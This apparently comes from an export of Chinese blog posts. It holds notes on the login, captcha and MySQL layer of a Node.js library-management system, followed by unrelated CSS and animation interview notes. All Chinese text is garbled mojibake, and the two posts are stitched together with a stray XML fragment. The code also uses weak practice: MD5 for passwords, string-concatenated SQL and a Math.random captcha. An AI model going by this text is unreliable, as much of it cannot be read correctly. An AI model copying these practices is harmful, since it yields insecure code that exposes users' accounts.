HTTPæ–¹æ³•é€šè¿‡æ ‡å‡†HTTPæ–¹æ³•å¯¹èµ„æºCRUD 3ï¼‰ç­‰ç­‰ç­‰ç­‰ ç™»å½•ç³»ç»Ÿæµç¨‹ç¬¬ä¸€æ­¥ï¼Œç”¨æˆ·è®¿é—®ç½‘ç«™(æœªç™»å½•)ï¼Œç”Ÿæˆç©ºçš„sessionï¼Œé€šè¿‡cookieè®°å½•sessionid 1234if(!req.session.userID || !req.session.userSign)&#123; res.redirect(&quot;/hopelibrary/user/login&quot;); return;&#125; ç¬¬äºŒæ­¥ï¼Œç”¨æˆ·è·³è½¬åˆ°ç™»å½•é¡µé¢ï¼šè¿™ä¸ªé¡µé¢ä¼šå‘åŽç«¯éªŒè¯ç æŽ¥å£å‘é€ä¸€ä¸ªè¯·æ±‚ï¼ŒæœåŠ¡å™¨æ ¹æ®æ­¤æ—¶ç”¨æˆ·çš„cookieä¸­è®°å½•çš„sessionidæ‰¾åˆ°å‰é¢ç”Ÿæˆçš„ç©ºsessionï¼Œç”Ÿæˆä¸€ä¸ªéªŒè¯ç  1234session&#123; sessionId: checkcode:&#125; ç¬¬ä¸‰æ­¥ï¼Œç”¨æˆ·å¡«å†™å®Œç”¨æˆ·ä¿¡æ¯ï¼Œç‚¹å‡»æäº¤ï¼Œè¡¨å•ä¿¡æ¯åŒ…æ‹¬ ä¼šè¢«å‘é€åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨é¦–å…ˆæ ¹æ®ç”¨æˆ·è¯·æ±‚ä¸­ç”¨æˆ·çš„cookieä¸­çš„sessionidï¼Œæ‰¾åˆ°è®¾ç½®çš„éªŒè¯ç ï¼Œå’Œå‰ç«¯å‘é€çš„éªŒè¯ç è¿›è¡Œæ¯”å¯¹ï¼Œè‹¥ä¸€è‡´ï¼Œåˆ™ç»§ç»­è¿›è¡Œè´¦å·å¯†ç éªŒè¯ç™»å½•ï¼Œè‹¥ä¸ä¸€è‡´åˆ™è¿”å›žé”™è¯¯ ç¬¬å››æ­¥ï¼Œå»ºç«‹ä¸Žmysqlæ•°æ®åº“çš„è¿žæŽ¥ï¼ŒæŸ¥è¯¢ç”¨æˆ·åº“ï¼Œè¿”å›žç»“æžœå­˜åœ¨åˆ™è®¾ç½®cookieå’Œsessionå¹¶è®¾ç½®ä¿¡æ¯ 123456789101112131415res.cookie(&quot;userId&quot;, rows[0].readerID, &#123; maxAge: 30 * 60 * 1000, path: &apos;/&apos;,&#125;);const message = &#123; code: 0, message: &quot;æˆåŠŸ&quot;, userId: user.readerID&#125;;setSession(req, &#123;userID: user.readerID, userSign: true&#125;);function setSession(req,options) &#123; for(let a in options) &#123; req.session[a] = options[a]; &#125;&#125; ç¬¬äº”æ­¥ï¼ŒéªŒè¯ç éªŒè¯é€šè¿‡ï¼ŒéªŒè¯ç™»å½•ï¼Œå°†ç”¨æˆ·ä¿¡æ¯å­˜å…¥sessionï¼Œç”¨æˆ·å˜ä¸ºç™»å½•çŠ¶æ€ã€‚ 123456session&#123; sessionId: checkcode: userID: user.readerID userSign: true&#125; å¦‚æžœå­˜åœ¨sessionè·³è½¬åˆ°æ­£å¸¸é¡µé¢ 1234if(req.session.userSign) &#123; res.redirect(&apos;/hopelibrary/user&apos;); return;&#125; éªŒè¯ç captchapngç»„ä»¶ 12345678910111213141516171819202122232425exports.captchap=function (req, res, next) &#123; //è®¾ç½®å®½é«˜ var width=!isNaN(parseInt(req.query.width))?parseInt(req.query.width):100; var height=!isNaN(parseInt(req.query.height))?parseInt(req.query.height):48; //ç”Ÿæˆéšæœºæ•° var code = parseInt(Math.random()*9000+1000); //è®¾ç½®ä¸ºsessionä¸­çš„å€¼ req.session.checkcode = code; //ç”Ÿæˆå›¾ç‰‡ var p = new captchapng(width,height, code); p.color(0, 0, 0, 0); p.color(80, 80, 80, 255); var img = p.getBase64(); var imgbase64 = new Buffer(img,&apos;base64&apos;); //å“åº”å¤´ å“åº”ç±»åž‹å›¾ç‰‡ res.writeHead(200, &#123; &apos;Content-Type&apos;: &apos;image/png&apos; &#125;); res.end(imgbase64);&#125;const captchap=require(&quot;./checkcode&quot;).captchap;router.route(&quot;/checkcode&quot;).get(function(req, res) captchap(req,res);&#125;);//éªŒè¯ç  åŠ å¯†cryptoç»„ä»¶è¿›è¡Œmd5åŠ å¯† å‡çº§å®‰å…¨æ–¹é¢token è€ƒè™‘åˆ°ç½‘ç«™å®‰å…¨çš„é—®é¢˜ï¼Œç”¨æˆ·åšä»»ä½•æ“ä½œçš„æ—¶å€™éƒ½è¦éªŒè¯sessionã€‚sessionçš„ç”Ÿå‘½å‘¨æœŸå†³å®šè¿™ç§æ–¹å¼ä¹Ÿä¸æ˜¯ç»å¯¹å®‰å…¨çš„ï¼Œå‡å¦‚ç”¨æˆ·å·²ç»ç™»å½•äº†ï¼Œæ”»å‡»è€…æˆªå–åˆ°äº†ç”¨æˆ·å‘é€åˆ°æœåŠ¡å™¨çš„è¯·æ±‚ï¼Œç”¨è¯·æ±‚é‡Œçš„sessionid,åŽ»åšå…¶ä»–æ“ä½œï¼Œåªè¦è¢«æˆªå–çš„ç”¨æˆ·åœ¨çº¿ï¼ŒæœåŠ¡å™¨ä¸Šè¿™ä¸ªsessionæ²¡æœ‰è¿‡æœŸï¼Œé‚£æ“ä½œéƒ½èƒ½æˆåŠŸ æ•°æ®äº¤äº’db-common.js æ‹¼æŽ¥mysqlæŸ¥è¯¢å­—ç¬¦ä¸² è¿žæŽ¥æ•°æ®åº“ å®šä¹‰æ“ä½œæ–¹æ³• 123456789function operate(connect, table)&#123; this.table = table; this.connection = connect;&#125;operate.prototype.selectAll = function(callback) &#123; const action = &apos;SELECT * &apos; + &apos;FROM &apos; + this.table; console.log(&apos;action:&apos;+action); this.connection.query(action, callback)&#125;; hopeDB.js ç»§æ‰¿operateï¼Œå¹¶ç»‘å®šå…·ä½“æ•°æ®åº“ å®žçŽ°æ•°æ®åº“æ–¹æ³•åº“ 12345678910111213const connection = mysqlUtil.DBConnection;const adminOperate = new dbCommon.operate(connection, &apos;hopeadmin&apos;);const adminDB = &#123; selectAll: (callback) =&gt; &#123; adminOperate.selectAll((err, rows, fields) =&gt; &#123; if(err)&#123; console.log(err); return; &#125; callback&amp;&amp;callback(rows); &#125;); &#125;,&#125; å…·ä½“é¡µé¢ è°ƒç”¨æ–¹æ³• 12userDB.selectAll((rows) =&gt; &#123;&#125;) å°è£…å½“ä½ éœ€è¦éšè—ä¸€äº›å±žæ€§å’Œæ–¹æ³•æ—¶ï¼Œå°±å¯ä»¥å°†è¿™äº›å±žæ€§å’Œæ–¹æ³•å°è£…èµ·æ¥ï¼Œç„¶åŽé€šè¿‡ä¸€ä¸ªå¤–éƒ¨å¯ä»¥è°ƒç”¨çš„ç‰¹å®šæŽ¥å£ï¼ˆä¹Ÿå¯ä»¥è¯´æ˜¯ä¸€ä¸ªå…¬å…±çš„æ–¹æ³•ï¼‰è¿›è¡Œè°ƒç”¨ã€‚ é˜²æ­¢ä»£ç å†—ä½™,ä¹Ÿå¯ä»¥æ–¹ä¾¿ä»£ç çš„è°ƒç”¨,åŒæ—¶ä¹Ÿå¯ä»¥é˜²æ­¢ä¸å¿…è¦çš„é”™è¯¯ã€‚ å®‰å…¨ï¼Ÿ é¡µé¢æ¸²æŸ“ejsæ¨¡æ¿ï¼Œres.renderèŽ·å¾—ç›¸å…³ä¿¡æ¯ 1res.render(&quot;user/user-book&quot;,&#123;userName,userImg,userPermission,firstPath:&apos;borrow&apos;,secondPath:&apos;&apos;,book,bookCate,bookNum,bookPage:pageNum&#125;); é‰´æƒç³»ç»Ÿåˆ©ç”¨æœåŠ¡å™¨ç«¯çš„sessionï¼ˆä¼šè¯ï¼‰å’Œæµè§ˆå™¨ç«¯çš„cookieæ¥å®žçŽ°å‰åŽç«¯çš„è®¤è¯ ä¸åŒç®¡ç†æƒé™ç”¨æˆ·å…¥å£ä¸åŒ 1234&#123; adminID:admin.adminID, adminSign: true&#125; https://blog.csdn.net/weixin_40442219/article/details/83377530 é™„å½•ï¼šé¡¹ç›®ç»“æž„1. ç›®å½•ç»“æž„HopeLibrarySystem-master é¡¹ç›®æ–‡ä»¶ bin pm2é…ç½®ä¿¡æ¯ git_images node_modules public å…¬å…±cssã€jsã€å›¾ç‰‡ï¼ˆå›¾ä¹¦å°é¢ã€è®¾å¤‡ã€ç”¨æˆ·å¤´åƒå’Œå…¶ä»–å›¾ç‰‡ï¼‰ css main.css ä¸»è¦css img admin ç”¨æˆ·å¤´åƒ book å›¾ä¹¦å°é¢ equip è®¾å¤‡å›¾ç‰‡ user ç”¨æˆ·å¤´åƒ js admin-super adduser.js data charts.config.js hlayer hlayer.css hlayer.js layer public user favicon.ico routes api api-book-borrow.js api-book.js api-equip.js api-login.js api-user.js admin-book.js admin-equip.js admin-super.js admin.js book.js checkcode.js email-schedule.js equip.js mysql_util.js public.js user.js utils views å„é¡µé¢ejs api.md app.js config.js hopeWechat.sql lib.log package-lock.json package.json README.md 2. æ•°æ®åº“ç»“æž„bookborrow è®°å½•å€Ÿé˜…ä¹¦ç±æƒ…å†µ â€‹ borrowID å€Ÿé˜…åºå· â€‹ borrowBookID è¢«å€Ÿé˜…ä¹¦ID â€‹ borrowUserID å€Ÿé˜…è€…ID â€‹ borrowTime å€Ÿé˜…æ—¶é—´ â€‹ returnWhe â€‹ returnBefore é¢„å®šå½’è¿˜æ—¶é—´ equipborrow è®°å½•å€Ÿç”¨è®¾å¤‡æƒ…å†µ â€‹ borrowID å€Ÿç”¨åºå· â€‹ borrowEquipID è¢«å€Ÿç”¨è®¾å¤‡ID â€‹ borrowUserID å€Ÿç”¨è€…ID â€‹ borrowTime å€Ÿç”¨æ—¶é—´ â€‹ returnWhe â€‹ returnBefore é¢„å®šå½’è¿˜æ—¶é—´ â€‹ reservation æ˜¯å¦å®¡æ ¸é€šè¿‡ â€‹ reservationText å€Ÿç”¨ç†ç”± hopeadmin è®°å½•ç®¡ç†å‘˜ä¿¡æ¯ â€‹ adminID ç®¡ç†å‘˜ID â€‹ adminName ç®¡ç†å‘˜åå­— â€‹ adminPassword ç®¡ç†å‘˜å¯†ç  â€‹ adminEmail ç®¡ç†å‘˜é‚®ä»¶ â€‹ adminImgSrc ç®¡ç†å‘˜å¤´åƒè·¯å¾„ â€‹ adminPermissions ç®¡ç†å‘˜æƒé™ hopebook è®°å½•ä¹¦ç±ä¿¡æ¯ â€‹ bookID ä¹¦ID â€‹ bookImgSrc ä¹¦å°é¢è·¯å¾„ â€‹ bookName ä¹¦å â€‹ bookHopeID ä¹¦Hopeç¼–å· â€‹ bookAuthor ä¹¦ä½œè€… â€‹ bookISBN ä¹¦ISBN â€‹ bookPress ä¹¦å‡ºç‰ˆç¤¾ â€‹ bookCate ä¹¦ç±»ç›® â€‹ bookLeft æ˜¯å¦è¢«å€Ÿé˜… hopeequip è®°å½•è®¾å¤‡ä¿¡æ¯ â€‹ equipID è®¾å¤‡ID â€‹ equipHopeID è®¾å¤‡Hopeç¼–å· â€‹ equipName è®¾å¤‡å â€‹ equipImgSrc è®¾å¤‡å›¾ç‰‡è·¯å¾„ â€‹ equipAdminID è®¾å¤‡ç®¡ç†å‘˜ID â€‹ equipLeft æ˜¯å¦è¢«å€Ÿç”¨ hopereader è®°å½•ç”¨æˆ·ä¿¡æ¯ â€‹ readerID ç”¨æˆ·ID â€‹ readerName ç”¨æˆ·åå­— â€‹ readerPassword ç”¨æˆ·å¯†ç  â€‹ readerSex ç”¨æˆ·æ€§åˆ« â€‹ readerGroup ç”¨æˆ·å…´è¶£ç»„ â€‹ studentNumber ç”¨æˆ·å­¦å· â€‹ readerMajor ç”¨æˆ·ä¸“ä¸š â€‹ readerPhone ç”¨æˆ·ç”µè¯ â€‹ readerEmail ç”¨æˆ·é‚®ç®± â€‹ readerBadNum â€‹ userImgSrc ç”¨æˆ·å¤´åƒè·¯å¾„ https://www.cnblogs.com/chenchenluo/p/4197181.html https://blog.csdn.net/q809198545/article/details/79692483 https://www.cnblogs.com/mingjiatang/p/7495321.html https://www.jianshu.com/p/ff6763c7d823 https://www.cnblogs.com/chyingp/p/express-cookie-parser-deep-in.html https://www.jianshu.com/p/136a95f5bdc6]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2Finterview_CSS%2F</url>
    <content type="text"><![CDATA[å‰è¨€ tanslateZå¯ä»¥åˆ©ç”¨gpuåŠ é€Ÿ è¿™ä¸ªé—®é¢˜æ˜¯å› ä¸ºä½¿ç”¨transformå’ŒopacityåšCSSåŠ¨ç”»çš„æ—¶å€™ï¼Œä¼šå°†å…ƒç´ æå‡ä¸ºä¸€ä¸ªå¤åˆå±‚ï¼›è€Œä½¿ç”¨jsæ“ä½œcsså±žæ€§åšåŠ¨ç”»æ—¶ï¼Œå¿…é¡»ä½¿ç”¨translateZæˆ–will-changeæ‰èƒ½å°†å…ƒç´ å¼ºè¡Œæå‡è‡³ä¸€ä¸ªå¤åˆå±‚ã€‚ å…ƒç´ æœ¬èº«ä½¿ç”¨transformå’ŒopacityåšCSSåŠ¨ç”»çš„æ—¶å€™ï¼Œä¼šæå‰å‘Šè¯‰GPUåŠ¨ç”»å¦‚ä½•å¼€å§‹å’Œç»“æŸåŠæ‰€éœ€è¦çš„æŒ‡ä»¤ï¼›æ‰€ä»¥ä¼šåˆ›å»ºä¸€ä¸ªå¤åˆå±‚ï¼ˆæ¸²æŸ“å±‚ï¼‰ï¼Œå¹¶æŠŠé¡µé¢æ‰€æœ‰çš„å¤åˆå±‚å‘é€ç»™GPUï¼›ä½œä¸ºå›¾åƒç¼“å­˜ï¼Œç„¶åŽåŠ¨ç”»çš„å‘ç”Ÿä»…ä»…æ˜¯å¤åˆå±‚é—´ç›¸å¯¹ç§»åŠ¨ã€‚ è€Œä½¿ç”¨jsåšåŠ¨ç”»ï¼Œjså¿…é¡»åœ¨åŠ¨ç”»çš„æ¯ä¸€å¸§è®¡ç®—å…ƒç´ çš„çŠ¶æ€ï¼›å‘é€ç»™GPUï¼Œä½†ä¸ä¼šå°†å…ƒç´ æå‡è‡³ä¸€ä¸ªå¤åˆå±‚ï¼›æ‰€ä»¥æƒ³è®©å…ƒç´ æå‡è‡³ä¸€ä¸ªå¤åˆå±‚ï¼Œå¿…é¡»ä½¿ç”¨translateZæˆ–will-change: transform, opacityã€‚ window.requestAnimationFrame() å‘Šè¯‰æµè§ˆå™¨â€”â€”ä½ å¸Œæœ›æ‰§è¡Œä¸€ä¸ªåŠ¨ç”»ï¼Œå¹¶ä¸”è¦æ±‚æµè§ˆå™¨åœ¨ä¸‹æ¬¡é‡ç»˜ä¹‹å‰è°ƒç”¨æŒ‡å®šçš„å›žè°ƒå‡½æ•°æ›´æ–°åŠ¨ç”»ã€‚è¯¥æ–¹æ³•éœ€è¦ä¼ å…¥ä¸€ä¸ªå›žè°ƒå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œè¯¥å›žè°ƒå‡½æ•°ä¼šåœ¨æµè§ˆå™¨ä¸‹ä¸€æ¬¡é‡ç»˜ä¹‹å‰æ‰§è¡Œ æ˜¾ç¤ºå™¨ä¹Ÿä¼šä»¥æ¯ç§’60æ¬¡çš„é¢‘çŽ‡æ­£åœ¨ä¸æ–­çš„æ›´æ–°å±å¹•ä¸Šçš„å›¾åƒ**16.7ms**(1000/60â‰ˆ16.7 ä¸ŽsetTimeoutç›¸æ¯”ï¼ŒrequestAnimationFrameæœ€å¤§çš„ä¼˜åŠ¿æ˜¯ç”±ç³»ç»Ÿæ¥å†³å®šå›žè°ƒå‡½æ•°çš„æ‰§è¡Œæ—¶æœºã€‚å…·ä½“ä¸€ç‚¹è®²ï¼Œå¦‚æžœå±å¹•åˆ·æ–°çŽ‡æ˜¯60Hz,é‚£ä¹ˆå›žè°ƒå‡½æ•°å°±æ¯16.7msè¢«æ‰§è¡Œä¸€æ¬¡ï¼Œå¦‚æžœåˆ·æ–°çŽ‡æ˜¯75Hzï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶é—´é—´éš”å°±å˜æˆäº†1000/75=13.3msï¼Œæ¢å¥è¯è¯´å°±æ˜¯ï¼ŒrequestAnimationFrameçš„æ­¥ä¼è·Ÿç€ç³»ç»Ÿçš„åˆ·æ–°æ­¥ä¼èµ°ã€‚å®ƒèƒ½ä¿è¯å›žè°ƒå‡½æ•°åœ¨å±å¹•æ¯ä¸€æ¬¡çš„åˆ·æ–°é—´éš”ä¸­åªè¢«æ‰§è¡Œä¸€æ¬¡ï¼Œè¿™æ ·å°±ä¸ä¼šå¼•èµ·ä¸¢å¸§çŽ°è±¡ï¼Œä¹Ÿä¸ä¼šå¯¼è‡´åŠ¨ç”»å‡ºçŽ°å¡é¡¿çš„é—®é¢˜ã€‚ 123456789101112var progress = 0;//å›žè°ƒå‡½æ•°function render() &#123; progress += 1; //ä¿®æ”¹å›¾åƒçš„ä½ç½® if (progress &lt; 100) &#123; //åœ¨åŠ¨ç”»æ²¡æœ‰ç»“æŸå‰ï¼Œé€’å½’æ¸²æŸ“ window.requestAnimationFrame(render); &#125;&#125;//ç¬¬ä¸€å¸§æ¸²æŸ“window.requestAnimationFrame(render); CPUèŠ‚èƒ½ï¼šä½¿ç”¨setTimeoutå®žçŽ°çš„åŠ¨ç”»ï¼Œå½“é¡µé¢è¢«éšè—æˆ–æœ€å°åŒ–æ—¶ï¼ŒsetTimeout ä»ç„¶åœ¨åŽå°æ‰§è¡ŒåŠ¨ç”»ä»»åŠ¡ï¼Œç”±äºŽæ­¤æ—¶é¡µé¢å¤„äºŽä¸å¯è§æˆ–ä¸å¯ç”¨çŠ¶æ€ï¼Œåˆ·æ–°åŠ¨ç”»æ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼Œå®Œå…¨æ˜¯æµªè´¹CPUèµ„æºã€‚è€ŒrequestAnimationFrameåˆ™å®Œå…¨ä¸åŒï¼Œå½“é¡µé¢å¤„ç†æœªæ¿€æ´»çš„çŠ¶æ€ä¸‹ï¼Œè¯¥é¡µé¢çš„å±å¹•åˆ·æ–°ä»»åŠ¡ä¹Ÿä¼šè¢«ç³»ç»Ÿæš‚åœï¼Œå› æ­¤è·Ÿç€ç³»ç»Ÿæ­¥ä¼èµ°çš„requestAnimationFrameä¹Ÿä¼šåœæ­¢æ¸²æŸ“ï¼Œå½“é¡µé¢è¢«æ¿€æ´»æ—¶ï¼ŒåŠ¨ç”»å°±ä»Žä¸Šæ¬¡åœç•™çš„åœ°æ–¹ç»§ç»­æ‰§è¡Œï¼Œæœ‰æ•ˆèŠ‚çœäº†CPUå¼€é”€ã€‚ å‡½æ•°èŠ‚æµï¼šåœ¨é«˜é¢‘çŽ‡äº‹ä»¶(resize,scrollç­‰)ä¸­ï¼Œä¸ºäº†é˜²æ­¢åœ¨ä¸€ä¸ªåˆ·æ–°é—´éš”å†…å‘ç”Ÿå¤šæ¬¡å‡½æ•°æ‰§è¡Œï¼Œä½¿ç”¨requestAnimationFrameå¯ä¿è¯æ¯ä¸ªåˆ·æ–°é—´éš”å†…ï¼Œå‡½æ•°åªè¢«æ‰§è¡Œä¸€æ¬¡ï¼Œè¿™æ ·æ—¢èƒ½ä¿è¯æµç•…æ€§ï¼Œä¹Ÿèƒ½æ›´å¥½çš„èŠ‚çœå‡½æ•°æ‰§è¡Œçš„å¼€é”€ã€‚ä¸€ä¸ªåˆ·æ–°é—´éš”å†…å‡½æ•°æ‰§è¡Œå¤šæ¬¡æ—¶æ²¡æœ‰æ„ä¹‰çš„ï¼Œå› ä¸ºæ˜¾ç¤ºå™¨æ¯16.7msåˆ·æ–°ä¸€æ¬¡ï¼Œå¤šæ¬¡ç»˜åˆ¶å¹¶ä¸ä¼šåœ¨å±å¹•ä¸Šä½“çŽ°å‡ºæ¥ã€‚ 12345678var dis =0;function animation()&#123; requestAnimationFrame(function()&#123; div.style.left = ++dis; if(disx&lt;50) animation(); &#125;) &#125;animation(); https://blog.csdn.net/vhwfr2u02q/article/details/79492303ä¼ªç±» :active :any-link :blank :checked :current :default :defined :dir() :disabled :drop :empty :enabled :first :first-child :first-of-type :fullscreen :future :focus :focus-visible :focus-within :has() :host :host()) :host-context()) :hover :indeterminate :in-range :invalid :is() :lang() :last-child :last-of-type :left :link :local-link :not() :nth-child() :nth-col() :nth-last-child() :nth-last-col() :nth-last-of-type() :nth-of-type() :only-child :only-of-type :optional :out-of-range :past :placeholder-shown :read-only :read-write :required :right :root :scope :target :target-within :user-invalid :valid :visited :where() å†…è”å…ƒç´  1 a â€“ é”šç‚¹ 2 abbr â€“ ç¼©å†™ 3 acronym â€“ é¦–å­— 4 b â€“ ç²—ä½“(ä¸æŽ¨è) 5 bdo â€“ bidi override 6 big â€“ å¤§å­—ä½“ 7 br â€“ æ¢è¡Œ 8 cite â€“ å¼•ç”¨ 9 code â€“ è®¡ç®—æœºä»£ç (åœ¨å¼•ç”¨æºç çš„æ—¶å€™éœ€è¦) 10 dfn â€“ å®šä¹‰å­—æ®µ 11 em â€“ å¼ºè°ƒ 12 font â€“ å­—ä½“è®¾å®š(ä¸æŽ¨è) 13 iâ€“ æ–œä½“ 14 img â€“ å›¾ç‰‡ 15 input â€“ è¾“å…¥æ¡† 16 kbd â€“ å®šä¹‰é”®ç›˜æ–‡æœ¬ 17 label â€“ è¡¨æ ¼æ ‡ç­¾ 18 q â€“ çŸ­å¼•ç”¨ 19 s â€“ ä¸­åˆ’çº¿(ä¸æŽ¨è) 20 samp â€“ å®šä¹‰èŒƒä¾‹è®¡ç®—æœºä»£ç  21 select â€“ é¡¹ç›®é€‰æ‹© 22 small â€“ å°å­—ä½“æ–‡æœ¬ 23 span â€“ å¸¸ç”¨å†…è”å®¹å™¨ï¼Œå®šä¹‰æ–‡æœ¬å†…åŒºå— 24 strike â€“ ä¸­åˆ’çº¿ 25 strong â€“ ç²—ä½“å¼ºè°ƒ 26 sub â€“ ä¸‹æ ‡ 27 sup â€“ ä¸Šæ ‡ 28 textareaâ€“ å¤šè¡Œæ–‡æœ¬è¾“å…¥æ¡† 29 tt â€“ ç”µä¼ æ–‡æœ¬ 30 u â€“ ä¸‹åˆ’çº¿ 31 var â€“ å®šä¹‰å˜é‡ csså¯ä»¥ç»§æ‰¿çš„å±žæ€§å’Œä¸å¯ç»§æ‰¿çš„å±žæ€§2018.07.01 16:03:12å­—æ•° 169é˜…è¯» 677 ä¸å¯ç»§æ‰¿çš„ï¼šdisplayã€marginã€borderã€paddingã€backgroundã€heightã€min-heightã€max- heightã€widthã€min-widthã€max-widthã€overflowã€positionã€leftã€rightã€topã€ bottomã€z-indexã€floatã€clearã€table-layoutã€vertical-alignã€page-break-afterã€ page-bread-beforeå’Œunicode-bidi æ‰€æœ‰å…ƒç´ å¯ç»§æ‰¿ï¼švisibilityå’Œcursor å†…è”å…ƒç´ å¯ç»§æ‰¿ï¼šletter-spacingã€word-spacingã€white-spaceã€line-heightã€colorã€fontã€ font-familyã€font-sizeã€font-styleã€font-variantã€font-weightã€text- decorationã€text-transformã€direction å—çŠ¶å…ƒç´ å¯ç»§æ‰¿ï¼štext-indentå’Œtext-align åˆ—è¡¨å…ƒç´ å¯ç»§æ‰¿ï¼šlist-styleã€list-style-typeã€list-style-positionã€list-style-image è¡¨æ ¼å…ƒç´ å¯ç»§æ‰¿ï¼šborder-collapse 0äººç‚¹èµž æ—¥è®°æœ¬ transformposition display inline- flex åž‚ç›´å±…ä¸­ https://segmentfault.com/a/1190000016389031 123456789&lt;div class=&quot;red blue&quot;&gt;123&lt;/div&gt;&lt;div class=&quot;blue red&quot;&gt;123&lt;/div&gt;.red &#123; color: red&#125;.blue &#123; color: blue&#125; ä¸¤è“ æƒé‡ä¸€æ ·ï¼ŒæŒ‰ç…§å£°æ˜Žé¡ºåºï¼ŒåŽå£°æ˜Žçš„ä¼˜å…ˆã€‚ CSSå•ä½ å•ä½ æè¿° % ç™¾åˆ†æ¯” in è‹±å¯¸ cm åŽ˜ç±³ mm æ¯«ç±³ em 1em ç­‰äºŽå½“å‰çš„å­—ä½“å°ºå¯¸ã€‚2em ç­‰äºŽå½“å‰å­—ä½“å°ºå¯¸çš„ä¸¤å€ã€‚ä¾‹å¦‚ï¼Œå¦‚æžœæŸå…ƒç´ ä»¥ 12pt æ˜¾ç¤ºï¼Œé‚£ä¹ˆ 2em æ˜¯24ptã€‚åœ¨ CSS ä¸­ï¼Œem æ˜¯éžå¸¸æœ‰ç”¨çš„å•ä½ï¼Œå› ä¸ºå®ƒå¯ä»¥è‡ªåŠ¨é€‚åº”ç”¨æˆ·æ‰€ä½¿ç”¨çš„å­—ä½“ã€‚ ex ä¸€ä¸ª ex æ˜¯ä¸€ä¸ªå­—ä½“çš„ x-heightã€‚ (x-height é€šå¸¸æ˜¯å­—ä½“å°ºå¯¸çš„ä¸€åŠã€‚) pt ç£… (1 pt ç­‰äºŽ 1/72 è‹±å¯¸) pc 12 ç‚¹æ´»å­— (1 pc ç­‰äºŽ 12 ç‚¹) px åƒç´  (è®¡ç®—æœºå±å¹•ä¸Šçš„ä¸€ä¸ªç‚¹) é€‰æ‹©å™¨ ç›’æ¨¡åž‹border-box content-box BFCå—æ ¼å¼åŒ–ä¸Šä¸‹æ–‡Box æ˜¯ CSS å¸ƒå±€çš„å¯¹è±¡å’ŒåŸºæœ¬å•ä½ï¼Œé¡µé¢æ˜¯ç”±è‹¥å¹²ä¸ªBoxç»„æˆçš„ã€‚ å…ƒç´ çš„ç±»åž‹ å’Œ display å±žæ€§ï¼Œå†³å®šäº†è¿™ä¸ª Box çš„ç±»åž‹ã€‚ä¸åŒç±»åž‹çš„ Box ä¼šå‚ä¸Žä¸åŒçš„ Formatting Contextã€‚ Formatting Context Formatting Context æ˜¯é¡µé¢çš„ä¸€å—æ¸²æŸ“åŒºåŸŸï¼Œå¹¶ä¸”æœ‰ä¸€å¥—æ¸²æŸ“è§„åˆ™ï¼Œå†³å®šäº†å…¶å­å…ƒç´ å°†å¦‚ä½•å®šä½ï¼Œä»¥åŠå’Œå…¶å®ƒå…ƒç´ çš„å…³ç³»å’Œç›¸äº’ä½œç”¨ã€‚ Formatting Context æœ‰ BFC (Block formatting context)ï¼ŒIFC (Inline formatting context)ï¼ŒFFC (Flex formatting context) å’Œ GFC (Grid formatting context)ã€‚FFC å’Œ GFC ä¸º CC3 ä¸­æ–°å¢žã€‚ BFCå¸ƒå±€è§„åˆ™ BFCå†…ï¼Œç›’å­ä¾æ¬¡åž‚ç›´æŽ’åˆ—ã€‚ BFCå†…ï¼Œä¸¤ä¸ªç›’å­çš„åž‚ç›´è·ç¦»ç”± margin å±žæ€§å†³å®šã€‚å±žäºŽåŒä¸€ä¸ªBFCçš„ä¸¤ä¸ªç›¸é‚»Boxçš„marginä¼šå‘ç”Ÿé‡å ã€ç¬¦åˆåˆå¹¶åŽŸåˆ™çš„marginåˆå¹¶åŽæ˜¯ä½¿ç”¨å¤§çš„marginã€‘ BFCå†…ï¼Œæ¯ä¸ªç›’å­çš„å·¦å¤–è¾¹ç¼˜æŽ¥è§¦å†…éƒ¨ç›’å­çš„å·¦è¾¹ç¼˜ï¼ˆå¯¹äºŽä»Žå³åˆ°å·¦çš„æ ¼å¼ï¼Œå³è¾¹ç¼˜æŽ¥è§¦ï¼‰ã€‚å³ä½¿åœ¨å­˜åœ¨æµ®åŠ¨çš„æƒ…å†µä¸‹ä¹Ÿæ˜¯å¦‚æ­¤ã€‚é™¤éžåˆ›å»ºæ–°çš„BFCã€‚ BFCçš„åŒºåŸŸä¸ä¼šä¸Žfloat boxé‡å ã€‚ BFCå°±æ˜¯é¡µé¢ä¸Šçš„ä¸€ä¸ªéš”ç¦»çš„ç‹¬ç«‹å®¹å™¨ï¼Œå®¹å™¨é‡Œé¢çš„å­å…ƒç´ ä¸ä¼šå½±å“åˆ°å¤–é¢çš„å…ƒç´ ã€‚åä¹‹ä¹Ÿå¦‚æ­¤ã€‚ è®¡ç®—BFCçš„é«˜åº¦æ—¶ï¼Œæµ®åŠ¨å…ƒç´ ä¹Ÿå‚ä¸Žè®¡ç®—ã€‚ å¦‚ä½•åˆ›å»ºBFC æ ¹å…ƒç´ æˆ–å…¶å®ƒåŒ…å«å®ƒçš„å…ƒç´  æµ®åŠ¨å…ƒç´  (å…ƒç´ çš„ float ä¸æ˜¯ none) ç»å¯¹å®šä½å…ƒç´  (å…ƒç´ å…·æœ‰ position ä¸º absolute æˆ– fixed) å†…è”å— (å…ƒç´ å…·æœ‰ display: inline-block) è¡¨æ ¼å•å…ƒæ ¼ (å…ƒç´ å…·æœ‰ display: table-cellï¼ŒHTMLè¡¨æ ¼å•å…ƒæ ¼é»˜è®¤å±žæ€§) è¡¨æ ¼æ ‡é¢˜ (å…ƒç´ å…·æœ‰ display: table-caption, HTMLè¡¨æ ¼æ ‡é¢˜é»˜è®¤å±žæ€§) å…·æœ‰overflow ä¸”å€¼ä¸æ˜¯ visible çš„å—å…ƒç´ ï¼Œ display: flow-root column-span: all åº”å½“æ€»æ˜¯ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼Œå³ä¾¿å…·æœ‰ column-span: all çš„å…ƒç´ å¹¶ä¸è¢«åŒ…è£¹åœ¨ä¸€ä¸ªå¤šåˆ—å®¹å™¨ä¸­ã€‚ ä¸€ä¸ªå—æ ¼å¼åŒ–ä¸Šä¸‹æ–‡åŒ…æ‹¬åˆ›å»ºå®ƒçš„å…ƒç´ å†…éƒ¨æ‰€æœ‰å†…å®¹ï¼Œé™¤äº†è¢«åŒ…å«äºŽåˆ›å»ºæ–°çš„å—çº§æ 